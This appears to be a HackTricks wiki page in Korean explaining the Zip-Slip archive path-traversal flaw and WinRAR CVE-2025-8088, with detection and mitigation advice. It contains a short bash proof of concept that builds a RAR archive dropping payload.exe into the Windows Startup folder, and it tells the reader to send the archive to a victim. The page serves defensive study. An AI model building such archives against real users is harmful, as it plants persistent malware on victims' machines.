# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 개요

많은 아카이브 형식(ZIP, RAR, TAR, 7-ZIP 등)은 각 항목이 자체 **내부 경로**를 가질 수 있도록 허용합니다. 추출 유틸리티가 그 경로를 맹목적으로 존중할 경우, `..` 또는 **절대 경로**(예: `C:\Windows\System32\`)를 포함한 조작된 파일 이름이 사용자가 선택한 디렉토리 외부에 기록됩니다. 이 유형의 취약점은 *Zip-Slip* 또는 **아카이브 추출 경로 탐색**으로 널리 알려져 있습니다.

결과는 임의의 파일을 덮어쓰는 것부터 Windows *시작* 폴더와 같은 **자동 실행** 위치에 페이로드를 배치하여 **원격 코드 실행(RCE)**를 직접 달성하는 것까지 다양합니다.

## 근본 원인

1. 공격자가 하나 이상의 파일 헤더에 다음을 포함하는 아카이브를 생성합니다:
* 상대 탐색 시퀀스 (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* 절대 경로 (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. 피해자가 내장된 경로를 신뢰하고 이를 정리하거나 선택한 디렉토리 아래로 강제 추출하지 않는 취약한 도구로 아카이브를 추출합니다.
3. 파일이 공격자가 제어하는 위치에 기록되고 시스템이나 사용자가 해당 경로를 트리거할 때 다음에 실행/로드됩니다.

## 실제 사례 – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows용 WinRAR(`rar` / `unrar` CLI, DLL 및 휴대용 소스 포함)는 추출 중 파일 이름을 검증하지 못했습니다. 다음과 같은 항목을 포함하는 악의적인 RAR 아카이브:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
결과적으로 **선택된** 출력 디렉토리 외부에 위치하게 되고 사용자의 *Startup* 폴더 안에 있게 됩니다. Windows는 로그온 후 그곳에 있는 모든 것을 자동으로 실행하여 *지속적인* RCE를 제공합니다.

### PoC 아카이브 만들기 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
옵션 사용:
* `-ep`  – 파일 경로를 주어진 대로 정확하게 저장 (선행 `./`를 **제거하지 않음**).

피해자에게 `evil.rar`를 전달하고 취약한 WinRAR 빌드로 추출하도록 지시합니다.

### 실제 관찰된 악용 사례

ESET는 CVE-2025-8088을 악용하여 맞춤형 백도어를 배포하고 랜섬웨어 작업을 촉진하는 RAR 아카이브를 첨부한 RomCom (Storm-0978/UNC2596) 스피어 피싱 캠페인을 보고했습니다.

## 탐지 팁

* **정적 검사** – 아카이브 항목을 나열하고 `../`, `..\\`, *절대 경로* (`C:`) 또는 비정규 UTF-8/UTF-16 인코딩이 포함된 이름을 플래그합니다.
* **샌드박스 추출** – *안전한* 추출기(예: Python의 `patool`, 7-Zip ≥ 최신, `bsdtar`)를 사용하여 일회용 디렉토리에 압축을 풀고 결과 경로가 디렉토리 내에 있는지 확인합니다.
* **엔드포인트 모니터링** – WinRAR/7-Zip/etc.로 아카이브가 열린 직후 `Startup`/`Run` 위치에 새 실행 파일이 작성되면 경고합니다.

## 완화 및 강화

1. **추출기 업데이트** – WinRAR 7.13은 적절한 경로 정리를 구현합니다. 사용자는 WinRAR에 자동 업데이트 메커니즘이 없기 때문에 수동으로 다운로드해야 합니다.
2. 가능할 경우 **“경로 무시”** 옵션으로 아카이브를 추출합니다 (WinRAR: *추출 → "경로를 추출하지 않음"*).
3. 신뢰할 수 없는 아카이브는 **샌드박스** 또는 VM 내에서 엽니다.
4. 애플리케이션 화이트리스트를 구현하고 사용자 쓰기 액세스를 자동 실행 디렉토리로 제한합니다.

## 추가 영향을 받은 / 역사적 사례

* 2018 – 많은 Java/Go/JS 라이브러리에 영향을 미친 Snyk의 대규모 *Zip-Slip* 권고.
* 2023 – `-ao` 병합 중 유사한 탐색을 가진 7-Zip CVE-2023-4011.
* 쓰기 전에 `PathCanonicalize` / `realpath`를 호출하지 않는 모든 사용자 정의 추출 논리.

## 참조

- [BleepingComputer – WinRAR 제로데이 악용으로 아카이브 추출 시 악성코드 심기](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 변경 로그](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Zip Slip 취약점 보고서](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
